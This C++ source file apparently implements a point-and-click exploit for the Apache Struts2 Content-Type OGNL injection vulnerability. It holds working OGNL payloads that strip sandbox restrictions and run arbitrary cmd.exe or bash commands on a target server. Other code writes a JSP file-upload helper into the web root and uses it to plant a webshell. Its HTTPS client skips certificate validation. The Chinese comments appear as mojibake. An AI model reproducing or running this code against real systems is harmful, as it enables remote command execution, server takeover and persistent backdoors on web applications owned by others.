#include "stdafx.h"
#include <winsock2.h>
#include <atlbase.h>
#include <atlconv.h>
#include <stdio.h>
#include <afxinet.h>
#include <regex>
#include "Exp.h"

Exp::Exp(void)
{
	jspHelperFileName = "JspHelpComStruts2Xwork2OrgApache.jsp"; //JSPд�ļ����� Ĭ���ļ���

	/* JSPд�ļ����� */
	writeJspHelperCode = 
"<%@ page import=\"java.io.*\" %>\
<%\
	request.setCharacterEncoding(\"UTF-8\");\
	String fileData = request.getParameter(\"fd\");\
	String filePath = request.getParameter(\"fp\");\
	if(filePath.indexOf(\"/\") == -1 && filePath.indexOf(\"\\\\\") == -1)\
	{\
		filePath = request.getRealPath(\"/\") + filePath;\
	}\
	try\
	{\
		PrintWriter writer = new PrintWriter(new FileOutputStream(filePath));\
		writer.println(fileData);\
		writer.close();\
		out.print(\"0x00\");\
	}\
	catch(IOException e)\
	{\
		out.println(e.getMessage());\
	}\
%>";
}


Exp::~Exp(void)
{
}

CString Exp::executeCommand(CString url,CString command)
{
	// Content-Type �ֶ�ֵ
	CString contentType = "Content-Type: %{(#dataType='multipart/form-data').(#deafultMemb=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#mA?(#mA=#deafultMemb):((#cner=#context['com.opensymphony.xwork2.ActionContext.container']).(#oU=#cner.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#oU.getExcludedPackageNames().clear()).(#oU.getExcludedClasses().clear()).(#context.setMemberAccess(#deafultMemb)))).(#c='"
		+ command + "').(#osType=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#exeType=(#osType?{'cmd.exe','/c',#c}:{'/bin/bash','-c',#c})).(#thread=new java.lang.ProcessBuilder(#exeType)).(#thread.redirectErrorStream(true)).(#proc=#thread.start()).(#resOut=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#proc.getInputStream(),#resOut)).(#resOut.flush())}";
	//User-Agent �ֶ�ֵ
	CString userAgent = "User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5";
	CString header = contentType + "\n" + userAgent; //HTTP����ͷ
	CString postData = ""; //POST����
	DWORD statusCode; //HTTP״̬��
	DWORD timeout = 60000; //��ʱʱ�� ms
	DWORD retryTime = 1; //���Դ���
	DWORD retryDelay = 1000; //���Լ��ʱ�� ms
	CString exeResult = httpPost(url,header,postData,statusCode,timeout,retryTime,retryDelay);
	if(statusCode != 200) //״̬�벻��200
	{
		CString statusCodeStr;
		statusCodeStr.Format("%d", statusCode); 
		if(statusCode == -1) //URL����
			exeResult = "�����URL����ȷ!\n��������ȷ��URL";
		else if(statusCode == 0) //HTTP�������
			exeResult = "HTTP�������!\n����������������Ƿ���ͨ";
		else
			exeResult = "ִ��ʧ�ܣ�HTTP״̬��Ϊ " + statusCodeStr;
	}
	return exeResult;
}

CString Exp::getRootPath(CString url,DWORD& statusCode)
{
	// Content-Type �ֶ�ֵ
	CString contentType = "Content-Type: %{(#dataType='multipart/form-data').(#deafultMemb=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#mA?(#mA=#deafultMemb):((#cner=#context['com.opensymphony.xwork2.ActionContext.container']).(#oU=#cner.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#oU.getExcludedPackageNames().clear()).(#oU.getExcludedClasses().clear()).(#context.setMemberAccess(#deafultMemb)))).(#re=@org.apache.struts2.ServletActionContext@getRequest()).(#resW=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#resW.println(#re.getRealPath('/'))).(#resW.close()).(#resOut=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#resOut)).(#resOut.flush())}";
	//User-Agent �ֶ�ֵ
	CString userAgent = "User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5";
	CString header = contentType + "\n" + userAgent; //HTTP����ͷ
	CString postData = ""; //POST����
	DWORD timeout = 60000; //��ʱʱ�� ms
	DWORD retryTime = 1; //���Դ���
	DWORD retryDelay = 1000; //���Լ��ʱ�� ms
	CString pathResult = httpPost(url,header,postData,statusCode,timeout,retryTime,retryDelay);
	if(statusCode != 200) //״̬�벻��200
	{
		CString statusCodeStr;
		statusCodeStr.Format("%d", statusCode);
		if(statusCode == -1) //URL����
			pathResult = "�����URL����ȷ!\n��������ȷ��URL";
		else if(statusCode == 0) //HTTP�������
			pathResult = "HTTP�������!\n����������������Ƿ���ͨ";
		else
			pathResult = "��ȡ��վ��Ŀ¼ʧ�ܣ�HTTP״̬��Ϊ " + statusCodeStr;
	}
	return pathResult;
}

CString Exp::writeFile(CString url,CString filePath,CString writeData)
{
	CString writeJspHelperCodeEncode = urlEncode(writeJspHelperCode,CP_ACP,CP_UTF8); //ת����URL����
	/* ͨ��OGNLдJSPд�ļ����ֵ������� */
	//Content-Type�ֶ�ֵ
	CString contentType = "Content-Type: %{(#dataType='multipart/form-data').(#deafultMemb=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#mA?(#mA=#deafultMemb):((#cner=#context['com.opensymphony.xwork2.ActionContext.container']).(#oU=#cner.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#oU.getExcludedPackageNames().clear()).(#oU.getExcludedClasses().clear()).(#context.setMemberAccess(#deafultMemb)))).(#wDataBase='" 
		+ writeJspHelperCodeEncode + 
		"').(#re=@org.apache.struts2.ServletActionContext@getRequest()).(#wPath=#re.getRealPath('/')+'"
		+ jspHelperFileName +
		"').(#wData=@java.net.URLDecoder@decode(#wDataBase,'UTF-8')).(#sb=new java.lang.StringBuilder(#wPath)).(#fileOS=new java.io.FileOutputStream(#sb)).(#fileOS.write(#wData.getBytes())).(#fileOS.close()).(#resW=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#resW.println('0x00,'+#re.getContextPath())).(#resW.close()).(#resOut=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#resOut)).(#resOut.flush())}";

	//User-Agent �ֶ�ֵ
	CString userAgent = "User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5";
	CString header = contentType + "\n" + userAgent; //HTTP����ͷ
	CString postData = ""; //POST����
	DWORD statusCode; //HTTP״̬��
	DWORD timeout = 60000; //��ʱʱ�� ms
	DWORD retryTime = 1; //���Դ���
	DWORD retryDelay = 1000; //���Լ��ʱ�� ms
	CString writeResult = httpPost(url,header,postData,statusCode,timeout,retryTime,retryDelay);
	writeResult.Replace("\r",""); //ɾ���س�
	writeResult.Replace("\n",""); //ɾ������
	if(statusCode != 200 || writeResult.Mid(0,4) != "0x00") //״̬�벻��200 ���ҷ���ҳ��ǰ4���ַ����� 0x00 ��˵��OGNLд�ļ�ʧ��
	{
		CString statusCodeStr;
		statusCodeStr.Format("%d", statusCode); 
		if(statusCode == -1) //URL����
			writeResult = "�����URL����ȷ!\n��������ȷ��URL";
		else if(statusCode == 0) //HTTP�������
			writeResult = "HTTP�������!\n����������������Ƿ���ͨ";
		else
			writeResult = "д���ļ�ʧ�ܣ�HTTP״̬��Ϊ " + statusCodeStr;
		return writeResult;
	}
	/* ͨ��JSPд�ļ������ϴ��ļ��������� */
	/* URL���� */
	CString jspHelperPath = writeResult.Mid(5) + "/" + jspHelperFileName; //JSP����·��
	CString jspHelperURL; //JSP��������URL
	CString urlPrefix = "http://"; //URLǰ׺
	CString urlSeparator = "/"; //URL�ָ���
	int urlPrefixPos = url.Find(urlPrefix); //���ҵ�һ��ǰ׺λ��
	if(urlPrefixPos >= 0) //����ǰ׺
		url = url.Mid(urlPrefixPos+urlPrefix.GetLength()); //ȥ��ǰ׺
	int urlSeparatorPos = url.Find(urlSeparator); //���ҵ�һ���ָ���λ��
	if(urlSeparatorPos >= 0) //���ڷָ���
		jspHelperURL = url.Mid(0,urlSeparatorPos); //�õ���վ������
	else
		jspHelperURL = url; //�õ���վ������
	jspHelperURL = "http://" + jspHelperURL + jspHelperPath; //JSP��������URL
	/* ͨ��JSPд�ļ������ϴ��ļ� */
	contentType = "Content-Type: application/x-www-form-urlencoded\n";
	header = contentType + userAgent;
	postData = "fp=" + urlEncode(filePath,CP_ACP,CP_UTF8) + "&fd=" + urlEncode(writeData,CP_ACP,CP_UTF8);
	writeResult = httpPost(jspHelperURL,header,postData,statusCode,timeout,retryTime,retryDelay);
	if(writeResult.Mid(0,4) != "0x00") //���ҷ���ҳ��ǰ4���ַ����� 0x00 ��˵��JSP����д�ļ�ʧ��
	{
		CString statusCodeStr;
		statusCodeStr.Format("%d", statusCode);
		if(statusCode == -1) //URL����
			writeResult = "�����URL����ȷ!\n��������ȷ��URL";
		else if(statusCode == 0) //HTTP�������
			writeResult = "HTTP�������!\n����������������Ƿ���ͨ";
		else
			writeResult = "д���ļ�ʧ�ܣ�HTTP״̬��Ϊ " + statusCodeStr;
		return writeResult;
	}
	writeResult = "д���ļ��ɹ�!\n·��: " + filePath;
	return writeResult;
}

CString Exp::getShell(CString url,CString shellName,CString shellData)
{
	CString getshellResult = writeFile(url,shellName,shellData);
	if(getshellResult.Find("�ɹ�") != -1) //GETSHELL�ɹ�
		getshellResult = "Getshell �ɹ�!\n�����Ӧ�ø�Ŀ¼�µ�Webshell: " + shellName;
	else //ʧ��
		getshellResult = "Getshell ʧ��!\n" + getshellResult;
	return getshellResult;
}

CString Exp::urlEncode(CString strData,int srcCodepage, int dstCodepage) //URL���� srcCodepageԭ���� dstCodepageת��������� ����Сд
{
	CString resultStr = "";
	CString checkTempStr = "";
	BYTE byte;
	CString encodeResult = urlEncodeCore(strData,srcCodepage,dstCodepage);
	for(int i=0;i<encodeResult.GetLength();i++)
	{
		byte = encodeResult.GetAt(i);
		if(byte >= 0 && byte < 128)
			checkTempStr.Format("%%%02x",byte);
		else
		{
			checkTempStr.Format("%%%02x",byte);
			checkTempStr.MakeLower(); //ת��ΪСд
		}
		resultStr += checkTempStr;
	}
	return  resultStr;
}

CString Exp::urlEncodeCore(CString strData, int srcCodepage, int dstCodepage) //URL�������ʵ�� srcCodepageԭ���� dstCodepageת���������
{
	 int strlen = strData.GetLength();
	 int unicodeLen = MultiByteToWideChar(srcCodepage,0,strData,-1,NULL,0);
	 wchar_t* pUnicode = new wchar_t[unicodeLen+1];  
	 memset(pUnicode,0,(unicodeLen+1)*sizeof(wchar_t));
	 unicodeLen = MultiByteToWideChar(srcCodepage,0,strData,-1,(LPWSTR)pUnicode,unicodeLen);
	 int dstLen = WideCharToMultiByte(dstCodepage,0,(LPWSTR)pUnicode,-1,NULL,0,NULL,NULL); //����ת����ĳ���
	 BYTE *pDstData = new BYTE[dstLen+1];
	 memset(pDstData,0,dstLen+1);
	 dstLen = WideCharToMultiByte(dstCodepage,0,(LPWSTR)pUnicode,-1,(char*)pDstData,dstLen,NULL,NULL);
	 CString resultStr;
	 resultStr.Format("%s",pDstData);
	 delete[] pUnicode;
	 delete[] pDstData;
	 return  resultStr;
}

//POST���󣬷�������ҳ����,statusCodeΪ���ص�HTTP״̬�� timeoutΪ��ʱʱ�� retryTime���Դ��� retryDelay���Լ��ʱ��
CString Exp::httpPost(CString url,CString header,CString postData,DWORD& statusCode,DWORD timeout,DWORD retryTime,DWORD retryDelay)
{
	int urlType; //http���� 0 http 1 https
	CString urlHost; //����
	INTERNET_PORT urlPort; //�˿ں�
	CString urlPath; //·��
	CString resultPage = ""; //����ҳ��

	/* URL���� */
	if(!urlParse(url,urlType,urlHost,urlPort,urlPath)) //URL����ȷ
	{
		statusCode = -1;
		return resultPage;
	}
	try
	{
		CInternetSession httpSession;
		httpSession.SetOption(INTERNET_OPTION_CONNECT_TIMEOUT,timeout); //��ʱʱ��
		httpSession.SetOption(INTERNET_OPTION_CONNECT_BACKOFF,retryDelay);		// ���Լ��ʱ��	
		httpSession.SetOption(INTERNET_OPTION_CONNECT_RETRIES,retryTime);	//���Դ���
		DWORD httpFlags;
		CHttpConnection* httpConnection;
		CHttpFile* httpFile;
		if(urlType == 1) //https���͵�URL
		{
			httpConnection = httpSession.GetHttpConnection(urlHost,INTERNET_FLAG_SECURE,443); //����ΪHTTPS
			httpFile = httpConnection->OpenRequest(CHttpConnection::HTTP_VERB_POST,urlPath,NULL,1,NULL,"HTTP/1.1",INTERNET_FLAG_RELOAD|INTERNET_FLAG_SECURE|INTERNET_FLAG_IGNORE_CERT_CN_INVALID|INTERNET_FLAG_IGNORE_CERT_DATE_INVALID|INTERNET_FLAG_EXISTING_CONNECT|INTERNET_FLAG_NO_CACHE_WRITE);
			httpFile->QueryOption(INTERNET_OPTION_SECURITY_FLAGS, httpFlags);
			httpFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA|SECURITY_FLAG_IGNORE_REVOCATION;  //���ú���֤�����
			httpFile->SetOption(INTERNET_OPTION_SECURITY_FLAGS, httpFlags);
		}
		else //http���͵�URL
		{
			httpConnection = httpSession.GetHttpConnection(urlHost,urlPort);
			httpFile = httpConnection->OpenRequest(CHttpConnection::HTTP_VERB_POST,urlPath,NULL,1,NULL,"HTTP/1.1",INTERNET_FLAG_RELOAD|INTERNET_FLAG_EXISTING_CONNECT|INTERNET_FLAG_NO_CACHE_WRITE);
		}
		httpFile->SendRequest(header,header.GetLength(),(LPVOID)((LPCTSTR)postData),postData.GetLength());
		httpFile->QueryInfoStatusCode(statusCode);
		if(statusCode != 200)
			return resultPage;
		char readBuff[4096]={0};
		int readNum = 0;
		while((readNum = httpFile->Read((void*)readBuff,4095))>0)
		{
			readBuff[readNum] = '\0';
			resultPage += readBuff;
			memset(readBuff,0,4096);
		}
	}
	catch(CInternetException* e)
	{
		e->ReportError();
		statusCode = 0;
	}
	return resultPage;
}

/* URL���� ƥ��������ʽΪ ((http|https)://)(localhost|([a-zA-Z0-9\._-]+\.[a-zA-Z]{2,6})|([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}))(:[0-9]{1,4})*(/[a-zA-Z0-9\&%_\./-~-!]*)? */
bool Exp::urlParse(CString url,int&httpType,CString& host,unsigned short int& port,CString& path)
{
	CString httpPrefix = "http://";
	CString httpsPrefix = "https://";
	CString httpRegEx = "((http|https)://)(localhost|([a-zA-Z0-9\\._-]+\\.[a-zA-Z]{2,6})|([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}))(:[0-9]{1,4})*(/[a-zA-Z0-9\\&%_\\./-~-!]*)?"; //URLƥ��������ʽ
	url.Replace("\\","/"); //��б�ܻ���б��
	if(url.Mid(0,httpPrefix.GetLength()) != httpPrefix && url.Mid(0,httpsPrefix.GetLength()) != httpsPrefix) //�����URLû��ǰ׺
		url = "http://" + url; //���ǰ׺
	else //ͳһ��ǰ׺����Сд
		url = url.Mid(0,5).MakeLower() + url.Mid(5);
	std::string urlRegExStr(httpRegEx.GetBuffer());
	std::string urlStr(url.GetBuffer());
	std::regex regexPat(urlRegExStr);
	if(!std::regex_match(urlStr,regexPat)) //����ƥ��ʧ��
		return false;
	if(url.Mid(0,httpPrefix.GetLength()) == httpPrefix) //http����
	{
		httpType = 0;
		url = url.Mid(httpPrefix.GetLength()); //ȥ��ǰ׺
	}
	else if(url.Mid(0,httpsPrefix.GetLength()) == httpsPrefix) //https����
	{
		httpType = 1;
		url = url.Mid(httpsPrefix.GetLength()); //ȥ��ǰ׺
	}
	else
		return false;
	CString urlSeparator = "/"; //URL�ָ���
	CString urlPortSeparator = ":"; //�˿ںŷָ�����
	int urlSeparatorPos = url.Find(urlSeparator); //��һ���ָ���λ��
	int urlPortSeparatorPos = url.Find(urlPortSeparator); //��һ���˿ںŷָ���λ��
	if(urlSeparatorPos == -1 && urlPortSeparatorPos == -1) //��������
	{
		host = url;
		port = 80;
		path = "";
	}
	else if(urlPortSeparatorPos != -1 &&  urlSeparatorPos == -1) //���ڶ˿ںŲ����ڷָ���
	{
		host = url.Mid(0,urlPortSeparatorPos);
		port = atoi(url.Mid(urlPortSeparatorPos+1));
		path = "";
	}
	else if(urlPortSeparatorPos == -1 &&  urlSeparatorPos != -1) //���ڷָ��������ڶ˿ں�
	{
		host = url.Mid(0,urlSeparatorPos);
		port = 80;
		path = url.Mid(urlSeparatorPos); //·��������һ���ָ���
	}
	else //������
	{
		if(urlPortSeparatorPos >= urlSeparatorPos) //URL����
			return false;
		host = url.Mid(0,urlPortSeparatorPos);
		int portLen = urlSeparatorPos-urlPortSeparatorPos-1;
		if(portLen > 0)
			port = atoi(url.Mid(urlPortSeparatorPos+1,portLen));
		else
			port = 80;
		path = url.Mid(urlSeparatorPos); //·��������һ���ָ���
	}
	return true;
}